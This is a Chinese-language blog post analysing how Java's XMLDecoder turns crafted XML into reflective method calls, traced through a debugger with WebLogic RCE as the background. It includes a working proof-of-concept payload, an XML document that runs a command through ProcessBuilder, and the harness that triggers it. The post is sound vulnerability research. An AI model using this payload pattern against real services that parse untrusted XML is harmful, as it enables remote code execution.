---
title: "Java XMLDecoder反序列化分析"
date: 2020-04-13T09:25:15+08:00
draft: false
tags:
- java
- 反序列化
series:
-
categories:
- 代码审计
---

XMLDecoder解析造成的问题
<!--more-->

## 简介
XMLDecoder是java自带的以SAX方式解析xml的类，其在反序列化经过特殊构造的数据时可执行任意命令。在Weblogic中由于多个包`wls-wast`、`wls9_async_response war`、`_async`使用了该类进行反序列化操作，出现了了多个RCE漏洞。

本文不会讲解weblogic的xml相关的洞，只是分析下Java中xml反序列化的流程，采用JDK2U21。

## 什么是SAX
SAX全称为`Simple API for XML`，在Java中有两种原生解析xml的方式，分别是SAX和DOM。两者区别在于：
1. Dom解析功能强大，可增删改查，操作时会将xml文档以文档对象的方式读取到内存中，因此适用于小文档
2. Sax解析是从头到尾逐行逐个元素读取内容，修改较为不便，但适用于只读的大文档

SAX采用事件驱动的形式来解析xml文档，简单来讲就是触发了事件就去做事件对应的回调方法。

在SAX中，读取到文档开头、结尾，元素的开头和结尾以及编码转换等操作时会触发一些回调方法，你可以在这些回调方法中进行相应事件处理：

- startDocument()
- endDocument()
- startElement()
- endElement()
- characters()

自己实现一个基于SAX的解析可以帮我们更好的理解XMLDecoder

```java
package com.xml.java;

import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.File;

public class DemoHandler extends DefaultHandler {
    public static void main(String[] args) {
        SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();
        try {
            SAXParser parser = saxParserFactory.newSAXParser();
            DemoHandler dh = new DemoHandler();
            String path = "src/main/resources/calc.xml";
            File file = new File(path);
            parser.parse(file, dh);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void characters(char[] ch, int start, int length) throws SAXException {
        System.out.println("characters()");
        super.characters(ch, start, length);
    }

    @Override
    public void startDocument() throws SAXException {
        System.out.println("startDocument()");
        super.startDocument();
    }

    @Override
    public void endDocument() throws SAXException {
        System.out.println("endDocument()");
        super.endDocument();
    }

    @Override
    public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
        System.out.println("startElement()");
        for (int i = 0; i < attributes.getLength(); i++) {
            // getQName()是获取属性名称，
            System.out.print(attributes.getQName(i) + "=\"" + attributes.getValue(i) + "\"\n");
        }
        super.startElement(uri, localName, qName, attributes);
    }

    @Override
    public void endElement(String uri, String localName, String qName) throws SAXException {
        System.out.println("endElement()");
        System.out.println(uri + localName + qName);
        super.endElement(uri, localName, qName);
    }
}
```
输出了

```
startDocument()
startElement()
characters()
startElement()
class="java.lang.ProcessBuilder"
characters()
startElement()
class="java.lang.String"
length="1"
characters()
startElement()
index="0"
characters()
startElement()
characters()
endElement()
string
characters()
endElement()
void
characters()
endElement()
array
characters()
startElement()
method="start"
endElement()
void
characters()
endElement()
object
characters()
endElement()
java
endDocument()
```
可以看到，我们通过继承SAX的DefaultHandler类，重写其事件方法，就能拿到XML对应的节点、属性和值。那么XMLDecoder也是基于SAX实现的xml解析，不过他拿到节点、属性、值之后通过Expression创建对象及调用方法。接下来我们就来分析下XMLDecoder将XML解析为对象的过程。

## XMLDecoder反序列化分析
所有的xml处理代码均在`com.sun.beans.decoder`包下。先弹一个计算器

```xml
<java>
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="1" >
            <void index="0">
                <string>calc</string>
            </void>
        </array>
        <void method="start"/>
    </object>
</java>
```
```java
package com.xml.java;

import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;

public class Main {
    public static void main(String[] args) {
        String path = "src/main/resources/calc.xml";
        File file = new File(path);
        FileInputStream fis = null;
        try {
            fis = new FileInputStream(file);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        BufferedInputStream bis = new BufferedInputStream(fis);
        XMLDecoder xmlDecoder = new XMLDecoder(bis);
        xmlDecoder.readObject();
        xmlDecoder.close();
    }
}
```

运行弹出计算器，在java.lang.ProcessBuilder#start打断点，堆栈如下：

```
start:1006, ProcessBuilder (java.lang)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:601, Method (java.lang.reflect)
invoke:75, Trampoline (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:601, Method (java.lang.reflect)
invoke:279, MethodUtil (sun.reflect.misc)
invokeInternal:292, Statement (java.beans)
access$000:58, Statement (java.beans)
run:185, Statement$2 (java.beans)
doPrivileged:-1, AccessController (java.security)
invoke:182, Statement (java.beans)
getValue:153, Expression (java.beans)
getValueObject:166, ObjectElementHandler (com.sun.beans.decoder)
getValueObject:123, NewElementHandler (com.sun.beans.decoder)
endElement:169, ElementHandler (com.sun.beans.decoder)
endElement:309, DocumentHandler (com.sun.beans.decoder)
endElement:606, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)
emptyElement:183, AbstractXMLDocumentParser (com.sun.org.apache.xerces.internal.parsers)
scanStartElement:1303, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)
next:2717, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)
next:607, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)
scanDocument:489, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)
parse:835, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)
parse:764, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)
parse:123, XMLParser (com.sun.org.apache.xerces.internal.parsers)
parse:1210, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)
parse:568, SAXParserImpl$JAXPSAXParser (com.sun.org.apache.xerces.internal.jaxp)
parse:302, SAXParserImpl (com.sun.org.apache.xerces.internal.jaxp)
run:366, DocumentHandler$1 (com.sun.beans.decoder)
run:363, DocumentHandler$1 (com.sun.beans.decoder)
doPrivileged:-1, AccessController (java.security)
doIntersectionPrivilege:76, ProtectionDomain$1 (java.security)
parse:363, DocumentHandler (com.sun.beans.decoder)
run:201, XMLDecoder$1 (java.beans)
run:199, XMLDecoder$1 (java.beans)
doPrivileged:-1, AccessController (java.security)
parsingComplete:199, XMLDecoder (java.beans)
readObject:250, XMLDecoder (java.beans)
main:21, Main (com.xml.java)
```
XMLDecoder跟进readObject()
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/8ca41da5-71ae-1dc2-269e-c00a60eddc11.png)

跟进parsingComplete()
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/8af767d7-2cb6-67e0-ffbd-8af757d6c6fb.png)

其中`this.handler`为`DocumentHandler`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/3cb12103-0220-df47-88ca-d683b1035731.png)

到这里进入`com.sun.beans.decoder.DocumentHandler#parse`

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/6a686b4b-944d-332d-6d2e-2391deadedf5.png)

圈住的代码其实和我们写的`DemoHandler`里一模一样，通过`SAXParserFactory`工厂创建了实例，进而`newSAXParser`拿到SAX解析器，调用`parse`解析，那么接下来解析的过程，我们只需要关注DocumentHandler的几个事件函数就行了。

在`DocumentHandler`的构造函数中指定了可用的标签类型
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/19c3cebe-7013-707d-30f6-20157e5321d9.png)

对应了`com.sun.beans.decoder`包中的几个类
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/582e09fe-f9b2-c748-7e8a-7f7d020785a8.png)

在startElement中首先解析`java`标签，然后设置Owner和Parent。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/833ef0cf-260b-d0f6-d8b0-f790528414d6.png)

`this.getElementHandler(var3)`对应的就是从构造方法中放入`this.handlers`的hashmap取出对应的值，如果不是构造方法中的标签，会抛出异常。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/918aa1ae-5b29-03da-e2c6-d515d003b6eb.png)

然后解析`object`标签，拿到属性之后通过addAttribute()设置属性
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/51c1f952-27fd-d15c-9bbd-3655c87cfcdc.png)

在addAttribute()没有对class属性进行处理，抛给了父类`com.sun.beans.decoder.NewElementHandler#addAttribute`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/05069f7a-c40e-28f8-3fd3-5d30e662077b.png)

会通过findClass()去寻找`java.lang.ProcessBuilder`类
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/fd98350b-cb96-d2c6-d713-d44f1051593f.png)

通过classloader寻找类赋值给type
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/c8089179-0e94-a8ea-8948-ac8d79e19055.png)

赋值完之后跳出for循环进入`this.handler.startElement()`，不满足条件。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/41969012-d7b6-0bbc-0847-b0e2180d02c7.png)

接下来解析`array`标签，同样使用addAttribute对属性赋值
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/af6dda79-d0aa-d1e5-805d-8c09bf737c00.png)

同样抛给父类`com.sun.beans.decoder.NewElementHandler#addAttribute`处理
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/cf22d636-801c-3cac-0bec-f1ba80833477.png)

继续抛给父类`com.sun.beans.decoder.NewElementHandler#addAttribute`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/e924202e-606d-9155-64b5-32c5277056ea.png)

接下来继续设置length属性
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/d4e6dcad-d12c-55ba-8685-c48996fc4dc4.png)

最后进入`com.sun.beans.decoder.ArrayElementHandler#startElement`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/338d4b22-b22a-43af-a653-64311ae5d02c.png)

因为ArrayElementHandler类没有0个参数的getValueObject()重载方法，但是它继承了NewElementHandler，所以调用`com.sun.beans.decoder.NewElementHandler#getValueObject()`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/988b4d6d-d335-4f0c-61d9-5cfcabde7930.png)

这个getValueObject重新调用`ArrayElementHandler#getValueObject`两个参数的重载方法
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/931356c7-f9cb-7dda-5a7f-64ca3b946483.png)

`ValueObjectImpl.create(Array.newInstance(var1, this.length))`创建了长度为1、类型为String的数组并返回，到此处理完array标签。

接着处理void，创建VoidElementHandler，设置setOwner和setParent。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/b10fe71d-b6ef-e9ff-5db3-8816cacdc8f7.png)

调用父类`com.sun.beans.decoder.ObjectElementHandler#addAttribute`设置index属性
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/6b22f905-cea3-b4c9-4909-c9ae03474071.png)
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/69abeaf4-7f8e-237b-644e-baa3f219d57f.png)

继续解析string标签，不再赘述。

解析完所有的开始标签之后，开始解析闭合标签，最开始就是</string>，进入到endElement()
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/b4f65da3-f906-b923-7ca2-1b866f8039bd.png)

StringElementHandler没有endElement()，调用父类ElementHandler的endElement()
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/5ad1d68d-3f09-f7ba-2448-d7e978c95904.png)

调用本类的getValueObject()
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/6f2f4b9f-b262-3586-68d0-a2ae86a87686.png)
设置value为calc。

接着闭合void
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/c30e5275-c570-f477-f3f3-4a88bf7bdb23.png)

闭合array
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ac735251-6387-7516-a473-ea21929c05a2.png)

然后开始解析`<void method="start"/>`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f6f5bcdc-cb12-a3f7-4d36-de1ba748edad.png)

通过父类的addAttribute将this.method赋值为start
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/4648a8a0-9e7c-60c2-e016-4335bcb6600e.png)

随后闭合void标签
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/d67caaa5-a26b-8204-66e3-d1c5fdaea5f6.png)

调用`endElement`，`VoidElementHandler`类没有，所以调用父类`ObjectElementHandler.endElement`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/78c08738-2a52-180f-1656-3cc2e960ec0c.png)

调用`NewElementHandler`类无参`getValueObject`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/2277d6d4-e914-3ba2-80a9-d8e1059af4d4.png)

然后调用`VoidElementHandler`类有参`getValueObject`，但是`VoidElementHandler`没有这个方法，所以调用`VoidElementHandler`父类`ObjectElementHandler`的有参`getValueObject`

```java
protected final ValueObject getValueObject(Class<?> var1, Object[] var2) throws Exception {
        if (this.field != null) {
            return ValueObjectImpl.create(FieldElementHandler.getFieldValue(this.getContextBean(), this.field));
        } else if (this.idref != null) {
            return ValueObjectImpl.create(this.getVariable(this.idref));
        } else {
            Object var3 = this.getContextBean();
            String var4;
            if (this.index != null) {
                var4 = var2.length == 2 ? "set" : "get";
            } else if (this.property != null) {
                var4 = var2.length == 1 ? "set" : "get";
                if (0 < this.property.length()) {
                    var4 = var4 + this.property.substring(0, 1).toUpperCase(Locale.ENGLISH) + this.property.substring(1);
                }
            } else {
                var4 = this.method != null && 0 < this.method.length() ? this.method : "new";
            }

            Expression var5 = new Expression(var3, var4, var2);
            return ValueObjectImpl.create(var5.getValue());
        }
    }
```
跟进`Object var3 = this.getContextBean()`，因为本类没有getContextBean()，所以调用父类NewElementHandler的getContextBean()
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/14dab24b-6989-1b40-04ca-61846ec61015.png)

继续调用NewElementHandler父类ElementHandler的getContextBean()
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/1c2ca5e4-4b54-793e-e2f5-e78e30fe8797.png)

会调用`this.parent.getValueObject()`也就是ObjectElementHandler类，而ObjectElementHandler没有无参getValueObject()方法，会调用其父类NewElementHandler的方法
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/fe81829f-64bc-2932-ab4b-295fc432e0f7.png)
然后将值赋值给value返回

最终var3的值为`java.lang.ProcessBuilder`。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ea7e2b86-5a4b-b7f7-11d3-3eb2fc7a28fa.png)

var4赋值为start
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/24595096-5024-9acf-e183-3738aae6d572.png)

通过Expression的getValue()方法反射调用start，弹出计算器。

## Expression和Statement
两者都是Java对反射的封装，举个例子

```java
package com.xml.java.beans;

public class User {
    private int id;
    private String name;

    @Override
    public String toString() {
        return "User{" +
                "id=" + id +
                ", name='" + name + '\'' +
                '}';
    }

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String sayHello(String name) {
        return String.format("你好 %s!", name);
    }
}
```
```java
package com.xml.java;

import com.xml.java.beans.User;

import java.beans.Expression;
import java.beans.Statement;

public class TestMain {
    public static void main(String[] args) {
        testStatement();
        testExpression();
    }

    public static void testStatement() {
        try {
            User user = new User();
            Statement statement = new Statement(user, "setName", new Object[]{"张三"});
            statement.execute();
            System.out.println(user.getName());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void testExpression() {
        try {
            User user = new User();
            Expression expression = new Expression(user, "sayHello", new Object[]{"小明"});
            expression.execute();
            System.out.println(expression.getValue());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
运行结果

```
张三
你好 小明!
```

Expression是可以获得返回值的，方法是getValue()。Statement不能获得返回值。



**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**